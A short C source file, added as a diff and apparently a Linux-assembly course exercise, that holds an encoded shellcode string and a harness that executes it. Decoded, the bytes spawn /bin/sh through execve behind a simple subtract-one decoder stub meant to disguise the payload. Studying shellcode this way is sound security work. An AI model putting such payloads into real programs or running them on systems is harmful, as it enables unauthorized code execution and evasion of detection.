@@ -1,0 +1,17 @@
+// execute.c
+// Author: Joris Hartog
+// Date  : 09-12-2015
+// St.nr.: SLAE-704
+
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] = \
+"\xeb\x0c\x58\x6a\x19\x59\x80\x28\x01\x40\xe2\xfa\xeb\x05\xe8\xef\xff\xff\xff\x32\xc1\x51\x8a\xe3\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\xb1\x0c\xce\x81";
+
+void main() {
+	printf("Shellcode length: %d\n", strlen(code));
+	int (*ret)() = (int(*)())code;
+	ret();
+}
+
